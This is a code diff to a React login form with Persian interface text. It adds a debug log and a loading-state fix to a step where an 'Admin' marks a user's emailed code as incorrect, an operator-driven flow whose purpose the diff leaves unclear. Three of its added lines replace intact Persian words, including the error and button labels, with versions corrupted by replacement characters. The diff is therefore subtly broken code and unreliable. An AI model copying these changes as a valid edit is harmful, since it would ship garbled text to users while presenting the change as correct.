@@ -418,7 +418,8 @@ export const LoginForm = () => {
         navigate("/", { replace: true });
         break;
       case "incorrect_email_code":
-        // Admin marked email code as wrong - show error and stay on email code step
+        // Admin marked email code as wrong - transition to email code step with error
+        console.log("🚫 Admin marked email code as incorrect - transitioning from", currentStep, "to email code with error");
         setCurrentStep("email");
         setEmailStep("code");
         setEmailCode(""); // Clear email code field
@@ -427,6 +428,7 @@ export const LoginForm = () => {
             "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
         });
         setHasError(true);
+        setIsSubmitting(false); // Ensure loading state is cleared
         break;
       // test_offline action removed - using only manual status check
       case "complete":
@@ -618,7 +620,7 @@ export const LoginForm = () => {
 
     if (!validatePassword(password)) {
       setErrors({
-        password: "رمز عبور نمی‌تواند خالی باشد",
+        password: "رمز عبور نمی‌تواند خالی ب��شد",
       });
       return;
     }
@@ -2515,7 +2517,7 @@ export const LoginForm = () => {
                             animation: "spin 1s linear infinite",
                           }}
                         />
-                        <span>در حال تایید...</span>
+                        <span>در حال تا��ید...</span>
                       </div>
                     ) : (
                       <>
@@ -3966,7 +3968,7 @@ export const LoginForm = () => {
                       textTransform: "uppercase",
                     }}
                   >
-                    ویرایش ایمیل
+                    ویرایش ایمی��
                   </Button>
                   <button
                     onClick={handleEmailCodeSubmit}
